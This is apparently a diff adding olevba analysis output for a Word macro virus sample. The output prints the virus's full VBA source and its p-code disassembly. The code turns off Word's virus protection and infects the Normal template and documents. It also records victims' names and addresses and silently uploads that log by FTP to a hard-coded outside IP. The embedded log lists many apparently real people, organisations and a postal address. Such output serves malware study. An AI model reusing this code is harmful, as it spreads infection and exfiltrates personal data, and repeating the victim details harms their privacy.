@@ -1,0 +1,1692 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.Marker-based
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: ./Virus.MSWord.Marker-based - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+Private Sub Document_New()
+
+'Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58
+'YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM
+'Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM
+'Open Access Loves Nicky F. Also! 27/04/99 8:45:32
+'Open Access Loves Nicky F. Also! 27/04/99 16:20:14
+'Open Access Loves Nicky F. Also! 28/04/99 14:39:51
+'Open Access Loves Nicky F. Also! 30/04/99 16:24:24
+'Open Access Loves Nicky F. Also! 12/05/99 16:47:49
+End Sub
+
+
+'Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58
+'YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM
+'Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM
+'Open Access Loves Nicky F. Also! 27/04/99 8:55:35
+'Open Access Loves Nicky F. Also! 27/04/99 14:04:27
+'Open Access Loves Nicky F. Also! 27/05/99 14:50:12
+End Sub`
+
+Private Sub Label1_Click()
+
+'Open Access Loves Nicky F. Also! 8/06/99 20:39:59
+'V.U.T Loves Nicky F. Also! 9/06/99 18:53:21
+'Hien Loves Nicky F. Also! 6/10/99 7:57:15 AM
+'Huy Nguyen Loves Nicky F. Also! 6/28/99 11:02:24 AM
+End Sub
+Private Sub Document_Close()
+
+On Error Resume Next
+
+Const Marker = "<- this is a marker!"
+
+'Declare Variables
+Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
+Dim ad, nt As Object
+Dim OurCode, UserAddress, LogData, LogFile As String
+
+'Initialize Variables
+Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
+Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
+
+DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
+NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
+
+
+'Switch the VirusProtection OFF
+Options.VirusProtection = False
+
+
+  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
+  
+    If DocumentInfected = True Then
+      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
+    ElseIf NormalTemplateInfected = True Then
+      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
+    End If
+    
+    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
+    
+    For I = 1 To 4
+      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
+    Next I
+    LogFile = "C:\hsf" & LogFile & ".sys"
+    
+    Open LogFile For Output As #1
+    Print #1, LogData
+    Close #1
+    
+    Open "c:\netldx.vxd" For Output As #1
+    Print #1, "o 209.201.88.110"
+    Print #1, "user anonymous"
+    Print #1, "pass itsme@"
+    Print #1, "cd incoming"
+    Print #1, "ascii"
+    Print #1, "put " & LogFile
+    Print #1, "quit"
+    Close #1
+    
+    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
+    
+    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
+    
+  End If
+
+
+'Make sure that some conditions are true before we continue infecting anything
+If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
+   (ActiveDocument.SaveFormat = wdFormatDocument Or _
+   ActiveDocument.SaveFormat = wdFormatTemplate) Then
+   
+   
+  'Infect the NormalTemplate
+  If DocumentInfected = True Then
+  
+    SaveNormalTemplate = NormalTemplate.Saved
+  
+    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
+
+    
+    'Write a log file of this NormalTemplate infection
+    For I = 1 To Len(Application.UserAddress)
+      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
+        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
+          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
+        End If
+      Else
+        UserAddress = UserAddress & Chr(13) & "' "
+      End If
+    Next I
+
+    OurCode = OurCode & Chr(13) & _
+              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
+                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
+              "' " & Application.UserName & Chr(13) & _
+              "' " & UserAddress & Chr(13)
+
+
+    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
+    nt.CodeModule.AddFromString OurCode
+    
+    If SaveNormalTemplate = True Then NormalTemplate.Save
+    
+  End If
+
+
+  'Infect the ActiveDocument
+  If NormalTemplateInfected = True And _
+     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
+     ActiveDocument.Saved = False) Then
+  
+    SaveDocument = ActiveDocument.Saved
+    
+    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
+
+    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
+    ad.CodeModule.AddFromString OurCode
+    
+    If SaveDocument = True Then ActiveDocument.Save
+      
+  End If
+  
+    
+End If
+
+End Sub
+
+' Logfile -->
+
+' 09:08:36  - Saturday, 28 Nov 1998
+' SPo0Ky
+' Blue Planet
+'
+
+
+
+' 02:50:31 PM - Saturday, 28 Nov 1998
+' MARK B. SEAY
+'
+
+
+
+' 08:04:45 AM - Friday, 4 Dec 1998
+' UPS
+'
+
+
+
+' 11:43:35 AM - Thursday, 17 Dec 1998
+' WRO
+'
+
+
+
+' 11:37:56 AM - Tuesday, 29 Dec 1998
+' Dan Ross
+'
+
+
+
+' 09:50:06 AM - Monday, 11 Jan 1999
+' Karen M. Pinks
+'
+
+
+
+' 04:41:03 PM - Thursday, 21 Jan 1999
+' george w. connelly
+'
+
+
+
+' 06:35:17 PM - Tuesday, 26 Jan 1999
+' lynn ann casey
+'
+
+
+
+' 10:10:39  - Wednesday, 27 Jan 1999
+' Jo Baldock
+'
+
+
+
+' 10:49:33 AM - Monday, 1 Feb 1999
+' Richard P. Panico
+'
+
+
+
+' 05:11:22 PM - Wednesday, 3 Feb 1999
+' Jennifer A. Johnsonj
+'
+
+
+
+' 02:03:10  - Tuesday, 9 Feb 1999
+' Coles Myer Ltd.
+'
+
+
+
+' 05:05:46  - Wednesday, 10 Feb 1999
+' Coles Myer Ltd.
+'
+
+
+
+' 02:04:06 PM - Monday, 22 Feb 1999
+' Sally Papworth
+'
+
+
+
+' 12:39:10 PM - Tuesday, 2 Mar 1999
+' Coles Myer Ltd.
+'
+
+
+
+' 06:58:41  - Wednesday, 3 Mar 1999
+' Sonja Mills
+'
+
+
+
+' 12:02:55 PM - Tuesday, 16 Mar 1999
+' Coles Myer Ltd.
+'
+
+
+
+' 04:44:14 PM - Wednesday, 24 Mar 1999
+' RMIT University Library
+'
+
+
+
+' 11:47:20 AM - Friday, 26 Mar 1999
+' RMIT University Library
+'
+
+
+
+' 07:42:40 PM - Tuesday, 20 Apr 1999
+' RMIT University Library
+'
+
+
+
+' 12:19:56  - Friday, 23 Apr 1999
+' Phi
+'
+
+
+
+' 10:13:02 PM - Wednesday, 5 May 1999
+' ***
+'
+
+
+
+' 06:10:32 AM - Saturday, 29 May 1999
+' Huy Nguyen
+'
+
+
+
+' 07:45:25 PM - Monday, 31 May 1999
+' Huy Nguyen
+'
+
+
+
+' 03:18:50 pm - Thursday, 1 Jul 1999
+' VUT
+'
+
+
+'VUT Loves Nicky F. Also! 23/07/99 12:43:05 pm
+
+
+'VUT Loves Nicky F. Also! 4/08/99 1:34:30 pm
+
+
+'Building M Open Access Lab Loves Nicky F. Also! 24/08/99 14:03:32
+
+
+
+' 11:23:46  - Friday, 27 Aug 1999
+' Building M Open Access Lab
+'
+
+
+
+' 05:20:07 pm - Thursday, 23 Sep 1999
+' VUT
+'
+
+
+
+' 10:17:28 am - Friday, 24 Sep 1999
+' VUT
+'
+
+
+
+' 01:56:08 pm - Friday, 1 Oct 1999
+' VUT
+'
+
+
+
+' 06:18:28 pm - Tuesday, 5 Oct 1999
+' VUT
+'
+
+
+
+' 12:27:53 pm - Wednesday, 6 Oct 1999
+' VUT
+'
+
+
+
+' 12:18:55 pm - Thursday, 7 Oct 1999
+' VUT
+'
+
+
+
+' 11:20:34 am - Monday, 8 Nov 1999
+' VUT
+'
+
+
+
+' 06:29:46 pm - Monday, 8 Nov 1999
+' VUT
+'
+
+
+
+' 01:37:00 am - Saturday, 1 Jan 2000
+' VUT
+'
+
+
+
+' 12:05:41  - Tuesday, 14 Dec 1999
+' VUT
+'
+
+
+
+' 09:34:49  - Thursday, 23 Dec 1999
+' WMIT
+'
+
+
+
+' 03:18:04  - Tuesday, 4 Jan 2000
+' J Curson
+'
+
+
+
+' 12:01:25  - Tuesday, 18 Jan 2000
+' Sharon Pearson
+'
+
+
+
+' 08:19:24 AM - Tuesday, 25 Jan 2000
+' Leah Lau
+'
+
+
+
+' 11:44:43 AM - Monday, 31 Jan 2000
+' Leah Lau
+'
+
+
+
+' 03:20:47 PM - Wednesday, 16 Feb 2000
+' McCoyR
+'
+
+
+
+' 12:10:05 PM - Tuesday, 29 Feb 2000
+' R.Cochrane
+'
+
+
+
+' 10:37:11 AM - Friday, 17 Mar 2000
+' support
+'
+
+
+
+' 11:54:16  - Sunday, 19 Mar 2000
+' CHISHOLM INSTITUTE
+'
+
+
+Private Sub Document_Open()
+
+End Sub
+
+' 11:15:48 AM - Monday, 17 Jul 2000
+' support
+'
+
+
+
+' 12:43:46 PM - Monday, 17 Jul 2000
+' support
+'
+
+
+
+' 01:58:02 PM - Tuesday, 18 Jul 2000
+' support
+'
+
+
+
+' 03:18:46 PM - Tuesday, 18 Jul 2000
+' support
+'
+
+
+
+' 10:53:14 AM - Wednesday, 19 Jul 2000
+' support
+'
+
+
+
+' 05:10:42 PM - Wednesday, 19 Jul 2000
+' default
+'
+
+
+
+' 11:48:10 AM - Thursday, 20 Jul 2000
+' support
+'
+
+
+
+' 01:18:27 PM - Thursday, 20 Jul 2000
+' Roxanne Clemie
+' Chisholm Institute
+' Events Management
+' PO Box 1281
+' FRANKSTON  3199
+
+
+
+' 02:41:59 PM - Thursday, 20 Jul 2000
+' support
+'
+
+
+
+' 05:07:49 PM - Thursday, 27 Jul 2000
+' Information Systems
+'
+
+
+
+' 09:15:44 <(¤¿¤)> - Wednesday, 7 Jun 2000
+' Rose
+'
+
+
+
+' 02:09:39  - Friday, 11 Aug 2000
+' Replication System
+'
+
+
+' 02:58:01 PM - Wednesday, 28 Feb 2001
+' fs080298
+' fs080298@hotmail.com
+
+
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.Marker-based
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 19574 bytes
+' Line #0:
+' Line #1:
+' 	FuncDefn (Private Sub Document_New())
+' Line #2:
+' Line #3:
+' 	QuoteRem 0x0000 0x003F "Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58"
+' Line #4:
+' 	QuoteRem 0x0000 0x002D "YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM"
+' Line #5:
+' 	QuoteRem 0x0000 0x0037 "Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM"
+' Line #6:
+' 	QuoteRem 0x0000 0x0031 "Open Access Loves Nicky F. Also! 27/04/99 8:45:32"
+' Line #7:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 27/04/99 16:20:14"
+' Line #8:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 28/04/99 14:39:51"
+' Line #9:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 30/04/99 16:24:24"
+' Line #10:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 12/05/99 16:47:49"
+' Line #11:
+' 	EndSub 
+' Line #12:
+' Line #13:
+' Line #14:
+' 	QuoteRem 0x0000 0x003F "Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58"
+' Line #15:
+' 	QuoteRem 0x0000 0x002D "YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM"
+' Line #16:
+' 	QuoteRem 0x0000 0x0037 "Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM"
+' Line #17:
+' 	QuoteRem 0x0000 0x0031 "Open Access Loves Nicky F. Also! 27/04/99 8:55:35"
+' Line #18:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 27/04/99 14:04:27"
+' Line #19:
+' 	QuoteRem 0x0000 0x0032 "Open Access Loves Nicky F. Also! 27/05/99 14:50:12"
+' Line #20:
+' 	Reparse 0x0008 "End Sub`"
+' Line #21:
+' Line #22:
+' 	FuncDefn (Private Sub Label1_Click())
+' Line #23:
+' Line #24:
+' 	QuoteRem 0x0000 0x0031 "Open Access Loves Nicky F. Also! 8/06/99 20:39:59"
+' Line #25:
+' 	QuoteRem 0x0000 0x002B "V.U.T Loves Nicky F. Also! 9/06/99 18:53:21"
+' Line #26:
+' 	QuoteRem 0x0000 0x002C "Hien Loves Nicky F. Also! 6/10/99 7:57:15 AM"
+' Line #27:
+' 	QuoteRem 0x0000 0x0033 "Huy Nguyen Loves Nicky F. Also! 6/28/99 11:02:24 AM"
+' Line #28:
+' 	EndSub 
+' Line #29:
+' 	FuncDefn (Private Sub Document_Close())
+' Line #30:
+' Line #31:
+' 	OnError (Resume Next) 
+' Line #32:
+' Line #33:
+' 	Dim (Const) 
+' 	LitStr 0x0014 "<- this is a marker!"
+' 	VarDefn Marker
+' Line #34:
+' Line #35:
+' 	QuoteRem 0x0000 0x0011 "Declare Variables"
+' Line #36:
+' 	Dim 
+' 	VarDefn SaveDocument
+' 	VarDefn SaveNormalTemplate
+' 	VarDefn DocumentInfected
+' 	VarDefn NormalTemplateInfected (As Boolean)
+' Line #37:
+' 	Dim 
+' 	VarDefn ad
+' 	VarDefn nt (As Object)
+' Line #38:
+' 	Dim 
+' 	VarDefn OurCode
+' 	VarDefn UserAddress
+' 	VarDefn LogData
+' 	VarDefn LogFile (As String)
+' Line #39:
+' Line #40:
+' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
+' Line #41:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set ad 
+' Line #42:
+' 	SetStmt 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	MemLd VBComponents 
+' 	ArgsMemLd Item 0x0001 
+' 	Set nt 
+' Line #43:
+' Line #44:
+' 	Ld Marker 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x2710 
+' 	LitDI2 0x2710 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Find 0x0005 
+' 	St DocumentInfected 
+' Line #45:
+' 	Ld Marker 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x2710 
+' 	LitDI2 0x2710 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Find 0x0005 
+' 	St NormalTemplateInfected 
+' Line #46:
+' Line #47:
+' Line #48:
+' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
+' Line #49:
+' 	LitVarSpecial (False)
+' 	Ld Options 
+' 	MemSt VirusProtection 
+' Line #50:
+' Line #51:
+' Line #52:
+' 	ArgsLd Now 0x0000 
+' 	ArgsLd Day 0x0001 
+' 	LitDI2 0x0001 
+' 	Eq 
+' 	Paren 
+' 	LitStr 0x0000 ""
+' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
+' 	LitStr 0x0007 "LogFile"
+' 	Ld System 
+' 	ArgsMemLd PrivateProfileString 0x0003 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	Paren 
+' 	And 
+' 	IfBlock 
+' Line #53:
+' Line #54:
+' 	Ld DocumentInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	IfBlock 
+' Line #55:
+' 	LitDI2 0x0001 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St LogData 
+' Line #56:
+' 	Ld NormalTemplateInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	ElseIfBlock 
+' Line #57:
+' 	LitDI2 0x0001 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St LogData 
+' Line #58:
+' 	EndIfBlock 
+' Line #59:
+' Line #60:
+' 	Ld LogData 
+' 	LitDI2 0x0001 
+' 	Ld LogData 
+' 	LitStr 0x0005 "' Log"
+' 	LitStr 0x0008 "file -->"
+' 	Concat 
+' 	FnInStr3 
+' 	Ld LogData 
+' 	FnLen 
+' 	LitDI2 0x0001 
+' 	Ld LogData 
+' 	LitStr 0x0005 "' Log"
+' 	LitStr 0x0008 "file -->"
+' 	Concat 
+' 	FnInStr3 
+' 	Sub 
+' 	ArgsLd Mid$ 0x0003 
+' 	St LogData 
+' Line #61:
+' Line #62:
+' 	StartForVariable 
+' 	Ld I 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0004 
+' 	For 
+' Line #63:
+' 	Ld LogFile 
+' 	LitDI2 0x0008 
+' 	Ld Rnd 
+' 	Mul 
+' 	FnInt 
+' 	ArgsLd Str 0x0001 
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	Add 
+' 	St LogFile 
+' Line #64:
+' 	StartForVariable 
+' 	Ld I 
+' 	EndForVariable 
+' 	NextVar 
+' Line #65:
+' 	LitStr 0x0006 "C:\hsf"
+' 	Ld LogFile 
+' 	Concat 
+' 	LitStr 0x0004 ".sys"
+' 	Concat 
+' 	St LogFile 
+' Line #66:
+' Line #67:
+' 	Ld LogFile 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Output)
+' Line #68:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	Ld LogData 
+' 	PrintItemNL 
+' Line #69:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #70:
+' Line #71:
+' 	LitStr 0x000D "c:\netldx.vxd"
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Output)
+' Line #72:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0010 "o 209.201.88.110"
+' 	PrintItemNL 
+' Line #73:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x000E "user anonymous"
+' 	PrintItemNL 
+' Line #74:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x000B "pass itsme@"
+' 	PrintItemNL 
+' Line #75:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x000B "cd incoming"
+' 	PrintItemNL 
+' Line #76:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0005 "ascii"
+' 	PrintItemNL 
+' Line #77:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0004 "put "
+' 	Ld LogFile 
+' 	Concat 
+' 	PrintItemNL 
+' Line #78:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0004 "quit"
+' 	PrintItemNL 
+' Line #79:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #80:
+' Line #81:
+' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
+' 	Ld vbHide 
+' 	ArgsCall Shell 0x0002 
+' Line #82:
+' Line #83:
+' 	LitVarSpecial (True)
+' 	LitStr 0x0000 ""
+' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
+' 	LitStr 0x0007 "LogFile"
+' 	Ld System 
+' 	ArgsMemSt PrivateProfileString 0x0003 
+' Line #84:
+' Line #85:
+' 	EndIfBlock 
+' Line #86:
+' Line #87:
+' Line #88:
+' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
+' Line #89:
+' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
+' 	Ld DocumentInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	Ld NormalTemplateInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	Xor 
+' 	Paren 
+' 	Ld ActiveDocument 
+' 	MemLd SaveFormat 
+' 	Ld wdFormatDocument 
+' 	Eq 
+' 	Ld ActiveDocument 
+' 	MemLd SaveFormat 
+' 	Ld wdFormatTemplate 
+' 	Eq 
+' 	Or 
+' 	Paren 
+' 	And 
+' 	IfBlock 
+' Line #90:
+' Line #91:
+' Line #92:
+' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
+' Line #93:
+' 	Ld DocumentInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	IfBlock 
+' Line #94:
+' Line #95:
+' 	Ld NormalTemplate 
+' 	MemLd Saved 
+' 	St SaveNormalTemplate 
+' Line #96:
+' Line #97:
+' 	LitDI2 0x0001 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St OurCode 
+' Line #98:
+' Line #99:
+' Line #100:
+' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
+' Line #101:
+' 	StartForVariable 
+' 	Ld I 
+' 	EndForVariable 
+' 	LitDI2 0x0001 
+' 	Ld Application 
+' 	MemLd UserAddress 
+' 	FnLen 
+' 	For 
+' Line #102:
+' 	Ld Application 
+' 	MemLd UserAddress 
+' 	Ld I 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Ne 
+' 	IfBlock 
+' Line #103:
+' 	Ld Application 
+' 	MemLd UserAddress 
+' 	Ld I 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitDI2 0x000A 
+' 	ArgsLd Chr 0x0001 
+' 	Ne 
+' 	IfBlock 
+' Line #104:
+' 	Ld UserAddress 
+' 	Ld Application 
+' 	MemLd UserAddress 
+' 	Ld I 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	Concat 
+' 	St UserAddress 
+' Line #105:
+' 	EndIfBlock 
+' Line #106:
+' 	ElseBlock 
+' Line #107:
+' 	Ld UserAddress 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	LitStr 0x0002 "' "
+' 	Concat 
+' 	St UserAddress 
+' Line #108:
+' 	EndIfBlock 
+' Line #109:
+' 	StartForVariable 
+' 	Ld I 
+' 	EndForVariable 
+' 	NextVar 
+' Line #110:
+' Line #111:
+' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
+' 	Ld OurCode 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	LitStr 0x0002 "' "
+' 	Concat 
+' 	Ld Time 
+' 	LitStr 0x0010 "hh:mm:ss AMPM - "
+' 	ArgsLd Format$ 0x0002 
+' 	Concat 
+' 	Ld Date 
+' 	LitStr 0x0010 "dddd, d mmm yyyy"
+' 	ArgsLd Format$ 0x0002 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	LitStr 0x0002 "' "
+' 	Concat 
+' 	Ld Application 
+' 	MemLd UserName 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	LitStr 0x0002 "' "
+' 	Concat 
+' 	Ld UserAddress 
+' 	Concat 
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St OurCode 
+' Line #112:
+' Line #113:
+' Line #114:
+' 	LitDI2 0x0001 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #115:
+' 	Ld OurCode 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #116:
+' Line #117:
+' 	Ld SaveNormalTemplate 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld NormalTemplate 
+' 	ArgsMemCall Save 0x0000 
+' 	EndIf 
+' Line #118:
+' Line #119:
+' 	EndIfBlock 
+' Line #120:
+' Line #121:
+' Line #122:
+' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
+' Line #123:
+' 	LineCont 0x0008 05 00 05 00 13 00 05 00
+' 	Ld NormalTemplateInfected 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	Ld ActiveDocument 
+' 	MemLd FullName 
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	ArgsLd Mid$ 0x0003 
+' 	LitStr 0x0001 ":"
+' 	Eq 
+' 	Ld ActiveDocument 
+' 	MemLd Saved 
+' 	LitVarSpecial (False)
+' 	Eq 
+' 	Or 
+' 	Paren 
+' 	And 
+' 	IfBlock 
+' Line #124:
+' Line #125:
+' 	Ld ActiveDocument 
+' 	MemLd Saved 
+' 	St SaveDocument 
+' Line #126:
+' Line #127:
+' 	LitDI2 0x0001 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld nt 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St OurCode 
+' Line #128:
+' Line #129:
+' 	LitDI2 0x0001 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	MemLd CountOfLines 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	ArgsMemCall DeleteLines 0x0002 
+' Line #130:
+' 	Ld OurCode 
+' 	Ld ad 
+' 	MemLd CodeModule 
+' 	ArgsMemCall AddFromString 0x0001 
+' Line #131:
+' Line #132:
+' 	Ld SaveDocument 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld ActiveDocument 
+' 	ArgsMemCall Save 0x0000 
+' 	EndIf 
+' Line #133:
+' Line #134:
+' 	EndIfBlock 
+' Line #135:
+' Line #136:
+' Line #137:
+' 	EndIfBlock 
+' Line #138:
+' Line #139:
+' 	EndSub 
+' Line #140:
+' Line #141:
+' 	QuoteRem 0x0000 0x000C " Logfile -->"
+' Line #142:
+' Line #143:
+' 	QuoteRem 0x0000 0x0022 " 09:08:36  - Saturday, 28 Nov 1998"
+' Line #144:
+' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
+' Line #145:
+' 	QuoteRem 0x0000 0x000C " Blue Planet"
+' Line #146:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #147:
+' Line #148:
+' Line #149:
+' Line #150:
+' 	QuoteRem 0x0000 0x0024 " 02:50:31 PM - Saturday, 28 Nov 1998"
+' Line #151:
+' 	QuoteRem 0x0000 0x000D " MARK B. SEAY"
+' Line #152:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #153:
+' Line #154:
+' Line #155:
+' Line #156:
+' 	QuoteRem 0x0000 0x0021 " 08:04:45 AM - Friday, 4 Dec 1998"
+' Line #157:
+' 	QuoteRem 0x0000 0x0004 " UPS"
+' Line #158:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #159:
+' Line #160:
+' Line #161:
+' Line #162:
+' 	QuoteRem 0x0000 0x0024 " 11:43:35 AM - Thursday, 17 Dec 1998"
+' Line #163:
+' 	QuoteRem 0x0000 0x0004 " WRO"
+' Line #164:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #165:
+' Line #166:
+' Line #167:
+' Line #168:
+' 	QuoteRem 0x0000 0x0023 " 11:37:56 AM - Tuesday, 29 Dec 1998"
+' Line #169:
+' 	QuoteRem 0x0000 0x0009 " Dan Ross"
+' Line #170:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #171:
+' Line #172:
+' Line #173:
+' Line #174:
+' 	QuoteRem 0x0000 0x0022 " 09:50:06 AM - Monday, 11 Jan 1999"
+' Line #175:
+' 	QuoteRem 0x0000 0x000F " Karen M. Pinks"
+' Line #176:
+' 	QuoteRem 0x0000 0x0000 ""
+' Line #177:
+' Line #178:
+' Line #179:
+' Line #180:
+' 	QuoteRem 0x0000 0x0024 " 04:41:03 PM - Thursday, 21 Jan 1999"
+' Line #181:
+' 	QuoteRem 0x0000 0x0013 " george w. connelly"
